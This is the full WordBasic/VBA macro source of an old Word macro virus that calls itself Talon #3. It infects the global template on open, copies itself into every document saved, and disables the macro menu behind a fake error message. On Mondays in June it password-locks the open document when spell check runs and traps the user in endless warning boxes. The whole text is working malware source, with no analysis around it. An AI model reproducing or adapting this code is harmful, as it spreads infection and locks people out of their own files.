   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ToolsSpelling"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Checks the spelling in the active document"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsSpelling.MAIN"
   If WordBasic.Month(WordBasic.Now()) = 6 And WordBasic.Weekday(WordBasic.Now()) = 2 Then
       WordBasic.FileSaveAs Password:="talon3", WritePassword:="talon3"
   Again:
   WordBasic.MsgBox "I Have A Word For You To Spell  V I R U S", "Warning", 48
   WordBasic.MsgBox "Your document Has Just been Been Saved By The Word Macro Virus Talon #3, I Hope You Know The Password!!!", "Warning", 48
   WordBasic.MsgBox "Brought To You By Talon 1997", "Warning", 48
   GoTo Again
    End If
   WordBasic.ToolsSpelling
   End Sub

   Attribute VB_Name = "Toolsmacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Runs, creates, deletes, or revises a macro"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Toolsmacro.MAIN"
   WordBasic.MsgBox "This option is not available right now. Please install the HELP files to continue.", "Warning", 48

   End Sub

   Attribute VB_Name = "AuToOpEn"

   Public Sub MAIN()
   Dim iM
   Dim i
   Dim Y
   Dim F$
   Dim S$
    On Error GoTo -1: On Error GoTo Z
    iM = WordBasic.CountMacros(0, 0)
    For i = 1 To M
     If M___$(i, 0, 0) = "Info" Then Y = -1
     'End If
    Next i

    If Not Y Then
     F$ = WordBasic.[FileName$]()
     S$ = F$ + ":Info"
    WordBasic.MacroCopy S$, "Global:Info"
     S$ = F$ + ":FSAB"
    WordBasic.MacroCopy S$, "Global:fILESAVEAs", 1
     S$ = F$ + ":ToolsSpelling"
    WordBasic.MacroCopy S$, "Global:ToolsSpelling", 1
     S$ = F$ + ":FSAB"
    WordBasic.MacroCopy S$, "Global:FSAB", 1
     S$ = F$ + ":AOB"
    WordBasic.MacroCopy S$, "Global:AOB", 1
     S$ = F$ + ":ToolsMacro"
    WordBasic.MacroCopy S$, "Global:ToolsMacro", 1
    End If

   Z:

   End Sub

   Attribute VB_Name = "Info"
   Dim Word
   Dim Macro
   Dim Talon
   Dim Activates
   Dim Mondays
   Dim In_
   Dim June
   Dim Saves
   Dim The
   Dim Document
   Dim With_
   Dim A
   Dim Brought
   Dim You
   Dim By

    * * * * * * * * * * * * * * * * * * * * * *
             Word Macro Talon 3
   Activates On Mondays In_ June If WordBasic.SpellChecked
    Saves The Open Document With_ A Password

            Brought To You By Talon

   * * * * * * * * * * * * * * * * * * * * * * *

   Attribute VB_Name = "FSAB"

   Public Sub MAIN()
   Dim F$
   Dim T$
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    On Error GoTo -1: On Error GoTo Z
    F$ = WordBasic.[FileName$]()
    WordBasic.CurValues.FileSaveAs dlg
    WordBasic.Dialog.FileSaveAs dlg
    If dlg.Format = 0 Then dlg.Format = 1
     T$ = F$ + ":AuToOpEn"
    WordBasic.MacroCopy "Global:AOB", T$
     T$ = F$ + ":AOB"
    WordBasic.MacroCopy "Global:AOB", T$
     T$ = F$ + ":FSAB"
    WordBasic.MacroCopy "Global:FSAB", T$
     T$ = F$ + ":Info"
    WordBasic.MacroCopy "Global:Info", T$
     T$ = F$ + ":ToolsSpelling"
    WordBasic.MacroCopy "Global:ToolsSpelling", T$
     T$ = F$ + ":ToolsMacro"
    WordBasic.MacroCopy "Global:ToolsMacro", T$
           WordBasic.FileSaveAs dlg
   GoTo Q

   Z:
    If Err.Number <> 102 Then
     WordBasic.FileSaveAs dlg
    End If
   Q:

   End Sub

   Attribute VB_Name = "AOB"

   Public Sub MAIN()
   Dim iM
   Dim i
   Dim Y
   Dim F$
   Dim S$
    On Error GoTo -1: On Error GoTo Z
    iM = WordBasic.CountMacros(0, 0)
    For i = 1 To M
     If M___$(i, 0, 0) = "Info" Then Y = -1
     'End If
    Next i

    If Not Y Then
     F$ = WordBasic.[FileName$]()
     S$ = F$ + ":Info"
    WordBasic.MacroCopy S$, "Global:Info"
     S$ = F$ + ":FSAB"
    WordBasic.MacroCopy S$, "Global:fILESAVEAs", 1
     S$ = F$ + ":ToolsSpelling"
    WordBasic.MacroCopy S$, "Global:ToolsSpelling", 1
     S$ = F$ + ":FSAB"
    WordBasic.MacroCopy S$, "Global:FSAB", 1
     S$ = F$ + ":AOB"
    WordBasic.MacroCopy S$, "Global:AOB", 1
     S$ = F$ + ":ToolsMacro"
    WordBasic.MacroCopy S$, "Global:ToolsMacro", 1
    End If

   Z:

   End Sub
